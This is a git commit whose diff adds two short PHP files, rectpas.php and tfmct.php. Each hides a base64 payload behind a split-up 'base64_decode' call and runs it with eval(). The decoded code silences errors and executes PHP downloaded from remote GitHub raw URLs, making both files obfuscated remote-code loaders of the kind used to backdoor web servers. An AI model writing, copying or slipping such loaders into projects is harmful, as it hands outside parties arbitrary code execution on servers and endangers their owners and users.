218c49443f5469433629e900f99724688b403bb0
cl1122 <cindylara1122@gmail.com>
2024-11-24 16:17:09 +0700

    getct

---
+++ one/rectpas.php
@@ -0,0 +1,6 @@
+<?php
+$z = "QG51bGw7IEBlcnJvcl9yZXBvcnRpbmcoMCk7QG51bGw7IEBldmFsKCI/PiIuZmlsZV9nZXRfY29udGVudHMoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9jaW5keWxhcmExMTIyL2VqZWN0L3JlZnMvaGVhZHMvbWFpbi8xLzIvMy80LzUvcmVwYXMucGhwIikpPz4=";
+$a = "base"; $b = "64_decode"; $c = $a.$b;
+$string = $c($z);
+eval($string);
+?>
---
+++ one/tfmct.php
@@ -0,0 +1,6 @@
+<?php
+$z = "QG51bGw7IEBlcnJvcl9yZXBvcnRpbmcoMCk7QG51bGw7IEBldmFsKCI/PiIuZmlsZV9nZXRfY29udGVudHMoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9jaW5keWxhcmExMTIyL1Byb3RlY3QvbWFpbi9jdHRmbS5waHAiKSk/Pg==";
+$a = "base"; $b = "64_decode"; $c = $a.$b;
+$string = $c($z);
+eval($string);
+?>
